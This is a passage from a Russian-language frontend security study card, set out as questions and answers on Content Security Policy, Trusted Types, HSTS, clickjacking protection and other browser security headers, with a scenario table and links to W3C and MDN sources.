Сначала убрать уязвимый sink.

Затем ограничить последствия ошибки
через строгую CSP,
Trusted Types
и другие security headers.
```

</dd>
</dl>
<br>


## Дополнительные вопросы

<details>
<summary><strong>Защищает ли CSP от XSS полностью?</strong></summary>

<dl>
<dd>
<h2></h2>

Нет.

CSP может заблокировать:

- inline script;
- неизвестный script source;
- `eval`;
- часть каналов отправки данных;
- некоторые DOM XSS sinks через Trusted Types.

Но уязвимость может сохраниться через:

- разрешённый third-party script;
- небезопасный loader;
- DOM gadget;
- HTML/UI injection;
- слишком широкую policy;
- ошибочную Trusted Types policy.

Сначала используют safe DOM APIs, encoding и sanitization.

CSP остаётся независимым дополнительным слоем.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что означают <code>default-src</code> и <code>script-src</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

`default-src` задаёт fallback для fetch directives, которые не указаны явно.

`script-src` отдельно управляет JavaScript и переопределяет fallback для scripts.

Например:

```http
default-src 'none';
script-src 'self';
```

запрещает большинство ресурсов, но разрешает scripts текущего origin.

`default-src` не покрывает:

- `base-uri`;
- `form-action`;
- `frame-ancestors`.

Их задают отдельно.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что такое CSP nonce и каким он должен быть?</strong></summary>

<dl>
<dd>
<h2></h2>

Это случайное значение, связывающее CSP конкретного HTML response с разрешённым `<script>` или `<style>`.

Nonce должен:

- создаваться криптографически стойко;
- иметь достаточную случайность;
- быть новым для каждого generated response;
- совпадать в header и element;
- не попадать в attacker-controlled markup.

Постоянное значение из environment variable не является корректным nonce.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Чем nonce отличается от hash в CSP?</strong></summary>

<dl>
<dd>
<h2></h2>

Nonce связывает разрешение с конкретным response и подходит для динамически сформированного HTML.

Hash разрешает точное содержимое script и подходит для неизменяемого inline-кода.

```text
динамический SSR
→ nonce

статичный inline bootstrap
→ hash
```

Изменение содержимого script требует пересчитать hash.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Почему <code>unsafe-inline</code> ослабляет CSP?</strong></summary>

<dl>
<dd>
<h2></h2>

Для `script-src` оно разрешает произвольный inline JavaScript:

- `<script>`;
- event handlers;
- многие injection payload.

Это убирает одно из основных преимуществ CSP против XSS.

Вместо него используют:

- nonce;
- hash;
- external modules;
- отказ от inline handlers.

Для styles риск отличается, но разрешение также должно быть осознанным и минимальным.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что делает <code>'strict-dynamic'</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

Она передаёт доверие от script с nonce или hash к scripts, которые он загружает программно.

В CSP3 browsers host allowlists, scheme sources и `'self'` перестают быть основой разрешения таких scripts.

Это удобно для bundler chunks, но trusted loader обязан сам безопасно выбирать URLs.

Если loader строит `script.src` из query или API без проверки, `'strict-dynamic'` может разрешить attacker-controlled script.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Как внедрять CSP, не сломав приложение?</strong></summary>

<dl>
<dd>
<h2></h2>

Начинают с:

```http
Content-Security-Policy-Report-Only
```

Затем:

1. Собирают нарушения.
2. Удаляют ненужные зависимости.
3. Исправляют inline scripts и `eval`.
4. Добавляют nonce или hashes.
5. Проверяют основные пользовательские flows.
6. Включают enforced policy.
7. Продолжают собирать reports.

Нельзя автоматически добавлять в allowlist каждый origin из report.

Reports могут отражать атаки, extensions и лишние third-party resources.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Можно ли задать CSP через <code>&lt;meta&gt;</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

Можно задать ограниченную enforced policy:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'"
>
```

Но:

- policy действует только после element;
- ранее загруженные resources уже не блокируются;
- `frame-ancestors` не поддерживается;
- reporting directives не поддерживаются;
- Report-Only недоступен.

HTTP response header является предпочтительным способом.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Чем <code>frame-src</code> отличается от <code>frame-ancestors</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

`frame-src` отвечает:

```text
Какие страницы
может встроить текущая страница?
```

`frame-ancestors` отвечает:

```text
Какие страницы
могут встроить текущую страницу?
```

Для защиты текущего document от clickjacking нужен:

```http
frame-ancestors
```

`frame-src 'none'` не запрещает attacker-сайту встроить вашу страницу.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Как <code>frame-ancestors</code> защищает от clickjacking?</strong></summary>

<dl>
<dd>
<h2></h2>

Перед отображением document во frame browser проверяет всю цепочку parent documents.

```http
frame-ancestors 'none';
```

запрещает любое embedding.

```http
frame-ancestors 'self';
```

разрешает только same-origin ancestors.

При перечислении partner origins каждый разрешённый parent становится частью security model.

Directive должна приходить в HTTP header и не работает через CSP meta.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что делает HSTS и чего он не делает?</strong></summary>

<dl>
<dd>
<h2></h2>

HSTS сообщает browser использовать HTTPS для будущих обращений к host.

```http
Strict-Transport-Security:
  max-age=31536000;
  includeSubDomains
```

Header принимается только по HTTPS.

HSTS не защищает первое обращение до получения policy, если domain отсутствует в preload list.

Он также не исправляет:

- XSS;
- CSRF;
- слабую авторизацию;
- ошибки TLS configuration.

`includeSubDomains` включают только после проверки всех поддоменов.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что делает <code>X-Content-Type-Options: nosniff</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

Browser требует подходящий MIME type для script и style и не пытается произвольно угадать исполняемый тип по содержимому.

Это снижает риск выполнения:

- пользовательского upload;
- текстового response;
- ресурса с ошибочным типом.

Server всё равно должен возвращать правильный:

```http
Content-Type
```

После включения `nosniff` неправильно настроенные assets могут перестать загружаться.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Зачем нужна <code>Referrer-Policy</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

Она ограничивает данные, передаваемые в:

```http
Referer
```

Практичное значение:

```http
Referrer-Policy:
  strict-origin-when-cross-origin
```

Same-origin requests получают полный URL, а cross-origin обычно только origin.

Для более строгой приватности используют:

```text
no-referrer
same-origin
strict-origin
```

Secrets всё равно нельзя помещать в URL.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что дают COOP, COEP и CORP?</strong></summary>

<dl>
<dd>
<h2></h2>

**COOP** изолирует top-level document от неподходящих cross-origin окон.

**COEP** требует, чтобы загружаемые cross-origin resources явно разрешали embedding.

**CORP** позволяет владельцу resource ограничить его `no-cors` загрузку другими origins или sites.

COOP и COEP используются для cross-origin isolation и powerful APIs.

Они могут сломать:

- OAuth popup;
- payment integrations;
- iframe;
- CDN assets;
- fonts;
- analytics.

Их включают после отдельного тестирования.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Почему <code>form-action</code> нужно задавать отдельно?</strong></summary>

<dl>
<dd>
<h2></h2>

`form-action` не получает fallback из `default-src`.

Даже при:

```http
default-src 'none';
```

HTML form может иметь внешний destination, если `form-action` отсутствует.

Для обычного приложения задают:

```http
form-action 'self';
```

или точный список payment и authentication destinations.

Это уменьшает риск отправки данных через внедрённую форму.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Почему <code>base-uri</code> важна?</strong></summary>

<dl>
<dd>
<h2></h2>

Внедрённый `<base>` может изменить destination относительных:

- scripts;
- links;
- forms;
- images.

Для приложения, которому `<base>` не нужен:

```http
base-uri 'none';
```

Если нужен same-origin base:

```http
base-uri 'self';
```

Directive не наследуется от `default-src`.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Можно ли ослабить CSP вторым header?</strong></summary>

<dl>
<dd>
<h2></h2>

Нет.

Несколько enforced CSP применяются одновременно.

Resource должен пройти каждую policy.

Например:

```text
policy A:
img-src 'self'

policy B:
img-src images.example
```

не означает объединение двух allowlists.

Вторая policy способна только оставить ограничения такими же или сделать их строже.

Report-Only policy не блокирует и работает отдельно.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Почему <code>unsafe-eval</code> опасен?</strong></summary>

<dl>
<dd>
<h2></h2>

Он разрешает APIs, интерпретирующие строки как JavaScript:

- `eval`;
- `new Function`;
- string timers;
- некоторые runtime compilers.

Это увеличивает число DOM XSS sinks.

Development bundler может требовать eval-based source maps, но production build обычно должен работать без `'unsafe-eval'`.

Зависимость, требующая eval в production, проверяют отдельно.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Почему React inline styles могут нарушать CSP?</strong></summary>

<dl>
<dd>
<h2></h2>

React:

```tsx
<div
  style={{
    color: "red",
  }}
/>
```

создаёт inline style attribute.

Policy:

```http
style-src-attr 'none';
```

может его заблокировать.

Nonce предназначен для `<style>` elements, но не решает автоматически каждый style attribute.

Для строгой policy используют:

- classes;
- CSS Modules;
- external stylesheets;
- CSP-compatible CSS-in-JS.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Что дают CSP reports?</strong></summary>

<dl>
<dd>
<h2></h2>

Они показывают:

- нарушенную directive;
- заблокированный resource;
- document URL;
- source file;
- enforce или report-only режим.

Reports помогают:

- внедрять policy;
- искать новые dependencies;
- обнаруживать injection attempts;
- контролировать regressions.

Они являются недоверенными данными и могут содержать чувствительные URLs.

Endpoint требует validation, rate limiting, sanitization при отображении и ограниченный срок хранения.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Нужно ли использовать <code>X-XSS-Protection</code>?</strong></summary>

<dl>
<dd>
<h2></h2>

Как современную защиту — нет.

Header управлял устаревшими browser XSS filters, которые удалены или не поддерживаются современными browsers.

Основная защита:

- safe DOM APIs;
- encoding;
- sanitization;
- CSP;
- Trusted Types.

Для legacy compatibility иногда явно устанавливают:

```http
X-XSS-Protection: 0
```

но решение зависит от поддерживаемых старых browsers.

<h2></h2>
</dd>
</dl>

</details>

<details>
<summary><strong>Как найти причину CSP-ошибки?</strong></summary>

<dl>
<dd>
<h2></h2>

В DevTools проверяют:

1. Сообщение Console.
2. Effective directive.
3. Заблокированный URL.
4. Enforce или Report-Only.
5. CSP response headers.
6. Совпадение nonce.
7. Точный текст hash.
8. Наличие нескольких policies.
9. Redirects и MIME type.
10. Код dynamic loader.

Не следует сразу добавлять:

```text
*
unsafe-inline
unsafe-eval
```

Сначала определяют, нужен ли заблокированный resource и можно ли устранить небезопасный pattern.

<h2></h2>
</dd>
</dl>

</details>

## Где это встречается во frontend

| Сценарий | Что учитывать |
| --- | --- |
| SSR генерирует HTML и scripts | Создать nonce для response и передать его в CSP и доверенные `<script>` |
| HTML кешируется CDN | CSP header и nonce в HTML должны относиться к одному response variant |
| Статическая SPA без inline JavaScript | Использовать external scripts и `script-src 'self'` либо hashes |
| Vite/webpack development | Eval-based tooling может требовать отдельную development policy |
| CSS-in-JS | Передать nonce generated `<style>` либо использовать compile-time extraction |
| React использует `style={{ ... }}` | `style-src-attr 'none'` может заблокировать inline style attributes |
| Подключена аналитика | Проверить `script-src`, `connect-src`, `img-src` и объём передаваемых данных |
| Используется WebSocket | Добавить точный `wss:` endpoint в `connect-src` |
| Используется Web Worker | Настроить `worker-src`, при необходимости учесть `blob:` |
| Приложение открывает payment iframe | Настроить `frame-src` для provider |
| Админка не должна встраиваться | `frame-ancestors 'none'` и при необходимости `X-Frame-Options: DENY` |
| Приложение встраивается в partner portal | Точный `frame-ancestors` и проверка всей ancestor chain |
| Rich text использует `dangerouslySetInnerHTML` | Sanitization, controlled sink и Trusted Types |
| HTML form отправляется внешнему provider | Явно разрешить destination через `form-action` |
| Приложению не нужен `<base>` | Использовать `base-uri 'none'` |
| Страница использует OAuth popup | Проверить влияние COOP на `window.opener` и callback |
| Нужен `SharedArrayBuffer` | Спроектировать COOP, COEP, CORP/CORS и проверить `crossOriginIsolated` |
| Внедряется CSP | Начать с Report-Only, затем включить enforce policy |
| CSP reports отправляются в monitoring | Ограничить объём, очистить данные и не рендерить reports как HTML |
| Static hosting не позволяет задать headers | Настроить CDN/platform; meta CSP не заменяет `frame-ancestors` |
| Third-party CDN script | Минимизировать доверие, зафиксировать version, рассмотреть SRI и self-hosting |
| Script блокируется после redirect | Проверить конечный URL и все response headers |
| Ошибка есть только на странице `500` | Добавлять CSP и security headers к error documents |

## Связанные темы

- [02 XSS reflected stored DOM React](<./02 XSS reflected stored DOM React.md>)
- [08 Supply chain npm dependencies secrets third-party scripts](<./08 Supply chain npm dependencies secrets third-party scripts.md>)
- [11 postMessage iframe open redirect tabnabbing](<./11 postMessage iframe open redirect tabnabbing.md>)
- [05 Nginx static serving SPA fallback cache headers](<../DevOps/05 Nginx static serving SPA fallback cache headers.md>)
- [08 Source maps production debugging security](<../Tooling/08 Source maps production debugging security.md>)

## Источники

- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [W3C: Trusted Types](https://www.w3.org/TR/trusted-types/)
- [W3C: Permissions Policy](https://www.w3.org/TR/permissions-policy/)
- [W3C: Referrer Policy](https://www.w3.org/TR/referrer-policy/)
- [RFC 6797: HTTP Strict Transport Security](https://www.rfc-editor.org/rfc/rfc6797)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
- [MDN: Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy-Report-Only)
- [MDN: Reporting-Endpoints](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints)
- [MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)
- [MDN: X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options)
- [MDN: X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection)
- [MDN: Cross-Origin-Opener-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy)
- [MDN: Cross-Origin-Embedder-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy)
- [MDN: Cross-Origin-Resource-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Resource-Policy)

---

<!-- CARD-NAV-BOTTOM:START -->
[← 05 CORS same-origin preflight credentials](<./05 CORS same-origin preflight credentials.md>) · [↑ Security](<./README.md>) · [⌂ Все разделы](<../../README.md>) · [07 Auth permissions frontend backend responsibility →](<./07 Auth permissions frontend backend responsibility.md>)
<!-- CARD-NAV-BOTTOM:END -->
